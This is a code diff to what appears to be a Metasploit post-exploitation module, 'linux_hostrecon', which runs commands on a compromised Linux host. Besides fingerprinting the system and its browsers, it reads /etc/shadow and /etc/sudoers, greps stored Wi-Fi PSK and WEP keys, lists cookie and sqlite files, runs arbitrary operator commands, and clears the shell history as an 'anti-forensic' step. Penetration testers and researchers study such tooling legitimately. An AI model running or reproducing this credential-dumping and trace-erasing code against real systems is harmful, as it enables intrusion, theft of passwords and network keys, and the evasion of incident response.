@@ -198,8 +198,12 @@ def run
 
       #
       # Dump system information from target (fingerprints)
+      # Clear local variables to accept new data inputs ..
       #
       data_dump=''
+      check_opera=''
+      check_firefox=''
+      check_chromium=''
       print_status("Executing list of commands remotely ..")
       Rex::sleep(0.2)
       #
@@ -211,29 +215,43 @@ def run
       distro_uname = cmd_exec("uname -a")
       psq_version = cmd_exec("psql -V | awk {'print $3'}")
       ruby_version = cmd_exec("ruby -v  | awk {'print $1,$2'}")
-      gateway = cmd_exec("netstat -r | grep '255.' | awk {'print $3'}")
-      firefox_version = cmd_exec("firefox --version | awk {'print $3'}")
-      interface = cmd_exec("netstat -r | grep default | awk {'print $8'}")
-      hardware_bits = cmd_exec("lscpu | grep 'CPU op-mode' | awk {'print $3'}")
-      hardware_vendor = cmd_exec("lscpu | grep 'Vendor ID' | awk {'print $3'}")
-      sudo_version = cmd_exec("sudo -V | grep 'Sudo version' | awk {'print $3'}")
-      mem_dirty = cmd_exec("cat /proc/meminfo | grep 'Dirty' | awk {'print $2,$3'}")
-      mem_free = cmd_exec("cat /proc/meminfo | grep 'MemFree' | awk {'print $2,$3'}")
-      mem_total = cmd_exec("cat /proc/meminfo | grep 'MemTotal' | awk {'print $2,$3'}")
+      gateway = cmd_exec("netstat -r | grep \"255.\" | awk {'print $3'}")
+      interface = cmd_exec("netstat -r | grep \"default\" | awk {'print $8'}")
+      hardware_bits = cmd_exec("lscpu | grep \"CPU op-mode\" | awk {'print $3'}")
+      hardware_vendor = cmd_exec("lscpu | grep \"Vendor ID\" | awk {'print $3'}")
+      sudo_version = cmd_exec("sudo -V | grep \"Sudo version\" | awk {'print $3'}")
+      mem_dirty = cmd_exec("cat /proc/meminfo | grep \"Dirty\" | awk {'print $2,$3'}")
+      mem_free = cmd_exec("cat /proc/meminfo | grep \"MemFree\" | awk {'print $2,$3'}")
+      mem_total = cmd_exec("cat /proc/meminfo | grep \"MemTotal\" | awk {'print $2,$3'}")
       sys_lang = cmd_exec("set | egrep '^(LANG|LC_)' | cut -d '=' -f2 | cut -d '.' -f1")
-      sh_version = cmd_exec("bash --version | head -1 | awk {'print $2,$4'} | cut -d '-' -f1")
-      mem_available = cmd_exec("cat /proc/meminfo | grep 'MemAvailable' | awk {'print $2,$3'}")
-      model_name = cmd_exec("lscpu | grep 'Model name:' | awk {'print $3,$4,$5,$6,$7,$8,$9,$10'}")
-      target_ssid = cmd_exec("iw dev #{interface} scan | grep 'SSID' | head -1 | awk {'print $2'}")
-      distro_description = cmd_exec("cat /etc/*-release | grep 'DISTRIB_DESCRIPTION=' | cut -d '=' -f2")
+      mem_available = cmd_exec("cat /proc/meminfo | grep \"MemAvailable\" | awk {'print $2,$3'}")
+      sh_version = cmd_exec("bash --version | head -n 1 | awk {'print $2,$4'} | cut -d '-' -f1")
+      model_name = cmd_exec("lscpu | grep \"Model name:\" | awk {'print $3,$4,$5,$6,$7,$8,$9,$10'}")
+      target_ssid = cmd_exec("iw dev #{interface} scan | grep \"SSID\" | head -n 1 | awk {'print $2'}")
+      distro_description = cmd_exec("cat /etc/*-release | grep \"DISTRIB_DESCRIPTION=\" | cut -d '=' -f2")
       user_privs = cmd_exec("cat /etc/sudoers | grep \"#{user_name}\" | grep -v \"#\" | awk {'print $2,$3'}")
       localhost_ip = cmd_exec("ping -c 1 localhost | head -n 1 | awk {'print $3'} | cut -d '(' -f2 | cut -d ')' -f1")
-        print_status("Storing scan results into msf database ..")
-        Rex::sleep(0.7)
+        #
+        # Check for remote browsers installed versions ..
+        #
+        check_firefox = cmd_exec("which firefox")
+        if not check_firefox.nil?
+          firefox_version = cmd_exec("firefox --version | awk {'print $3'}")
+        end
+        check_chromium = cmd_exec("which chromium")
+        if not check_chromium.nil?
+          chromium_version = cmd_exec("chromium-browser --product-version")
+        end
+        check_opera = cmd_exec("which opera")
+        if not check_opera.nil?
+          opera_version = cmd_exec("opera -version | awk {'print $3'}")
+        end
         #
         # Store data into a local variable (data_dump) ..
         # to be able to write the logfile and display the outputs ..
         #
+        print_status("Storing scan results into msf database ..")
+        Rex::sleep(0.7)
         data_dump << "\n\n"
         data_dump << "linux_hostrecon logfile\n"
         data_dump << "Date/Hour: " + date_out + "\n"
@@ -245,8 +263,8 @@ def run
         data_dump << "Target Arch (bits)  : #{hardware_bits}\n"
         data_dump << "Target Arch (vendor): #{hardware_vendor}\n"
         data_dump << "CPU (Model name)    : #{model_name}\n"
-        data_dump << "Target mem free     : #{mem_free}\n"
         data_dump << "Target mem total    : #{mem_total}\n"
+        data_dump << "Target mem free     : #{mem_free}\n"
         data_dump << "Target mem available: #{mem_available}\n"
         data_dump << "Target mem dirty    : #{mem_dirty}\n"
         data_dump << "System language     : #{sys_lang}\n"
@@ -255,9 +273,22 @@ def run
         data_dump << "Python version      : #{py_version}\n"
         data_dump << "Ruby version        : #{ruby_version}\n"
         data_dump << "PostgreSQL version  : #{psq_version}\n"
-        data_dump << "Firefox version     : #{firefox_version}\n"
+
+          #
+          # display installed browsers versions ..
+          #
+          if not check_firefox.nil?
+            data_dump << "Firefox browser     : #{firefox_version}\n"
+          end
+          if not check_chromium.nil?
+            data_dump << "Chromium browser    : #{chromium_version}\n"
+          end
+          if not check_opera.nil?
+            data_dump << "Opera browser       : #{opera_version}\n"
+          end
+
         data_dump << "Target interface    : #{interface}\n"
-        data_dump << "target_SSID         : #{target_ssid}\n"
+        data_dump << "Target_SSID         : #{target_ssid}\n"
         data_dump << "Target IP addr      : #{host_ip}\n"
         data_dump << "Target gateway      : #{gateway}\n"
         data_dump << "Target localhost    : #{localhost_ip}\n"
@@ -293,15 +324,15 @@ def run
           distro_shells = cmd_exec("grep '^[^#]' /etc/shells")
           distro_history = cmd_exec("ls -la /root/.*_history")
           distro_logs = cmd_exec("find /var/log -type f -perm -4")
-          net_established = cmd_exec("netstat -atnp | grep 'ESTABLISHED'")
-          default_shell = cmd_exec("ps -p $$ | tail -1 | awk '{ print $4 }'")
+          net_established = cmd_exec("netstat -atnp | grep \"ESTABLISHED\"")
+          default_shell = cmd_exec("ps -p $$ | tail -n 1 | awk '{ print $4 }'")
           sudo_ers = cmd_exec("cat /etc/sudoers | grep -v -e \"^$\" | grep -v \"Defaults\" | grep -v \"#\"")
-            print_status("Storing scan results into msf database ..")
-            Rex::sleep(0.7)
             #
             # store data into a local variable (data_dump) ..
             # to be able to write the logfile and display the outputs ..
             #
+            print_status("Storing scan results into msf database ..")
+            Rex::sleep(0.7)
             data_dump << "+--------------------------+\n"
             data_dump << "|  AGRESSIVE SCAN REPORTS  |\n"
             data_dump << "+--------------------------+\n"
@@ -379,8 +410,8 @@ def run
           # bash commands to be executed remotely ..
           #
           # dump cookies
-          list_sqlite = cmd_exec("ls -a -R /root | grep 'sqlite'")
-          list_cookies = cmd_exec("ls /usr/share/pyshared/mechanize | grep 'cookie'")
+          list_sqlite = cmd_exec("ls -a -R /root | grep \"sqlite\"")
+          list_cookies = cmd_exec("ls /usr/share/pyshared/mechanize | grep \"cookie\"")
           # Dump target WIFI credentials stored ..
           wpa_out = cmd_exec("grep psk= /etc/NetworkManager/system-connections/*")
           wep_out = cmd_exec("grep wep-key0= /etc/NetworkManager/system-connections/*")
@@ -389,12 +420,12 @@ def run
           etc_shadow = cmd_exec("cat /etc/shadow")
           # list all uid/guid id's/info
           uuid_id = cmd_exec("for i in $(cat /etc/passwd | cut -d ':' -f1); do id $i; done")
-            print_status("Storing scan results into msf database ..")
-            Rex::sleep(0.7)
             #
             # store data into a local variable (data_dump) ..
             # to be able to write the logfile and display the outputs ..
             #
+            print_status("Storing scan results into msf database ..")
+            Rex::sleep(0.7)
             data_dump << "+--------------------------+\n"
             data_dump << "|  REMOTE CREDENTIALS DUMP |\n"
             data_dump << "+--------------------------+\n"
@@ -437,15 +468,15 @@ def run
         # check if single_command option its configurated ..
         if not exec_bash.nil?
           print_status("Executing user inputed bash command ..")
-          Rex::sleep(0.7)
+          Rex::sleep(1.0)
           # bash command to be executed remotely ..
           single_comm = cmd_exec("#{exec_bash}")
-            print_status("Storing scan results into msf database ..")
-            Rex::sleep(0.7)
             #
             # store data into a local variable (data_dump) ..
             # to be able to write the logfile and display the outputs ..
             #
+            print_status("Storing scan results into msf database ..")
+            Rex::sleep(0.7)
             data_dump << "+--------------------------------+\n"
             data_dump << "|    COMMAND EXECUTED REMOTELY   |\n"
             data_dump << "+--------------------------------+\n"
@@ -474,7 +505,7 @@ def run
      # IF sellected previous in advanced options (set STORE_LOOT true) ..
      #
      if datastore['STORE_LOOT'] == true
-       print_warning("Fingerprints stored under: ~/.msf4/loot folder")
+       print_good("Session logfile stored locally in: ~/.msf4/loot folder")
        store_loot("linux_hostrecon", "text/plain", session, data_dump, "linux_hostrecon.txt", "linux_hostrecon")
        Rex::sleep(0.5)
      end
@@ -482,8 +513,8 @@ def run
      # linux_hostrecon - Anti-forensic module ..
      # This funtion will delete all entrys from remote bash shell (history command list) ..
      #
-     if datastore['DEL_SHELL_HISTORY'] == true
-       print_warning("Remote bash shell history commands list deleted")
+     if datastore['DEL_BASH_HISTORY'] == true
+       print_good("Deleted commands list from remote bash_history file")
        cmd_exec("history -c")
        Rex::sleep(0.5)
      end
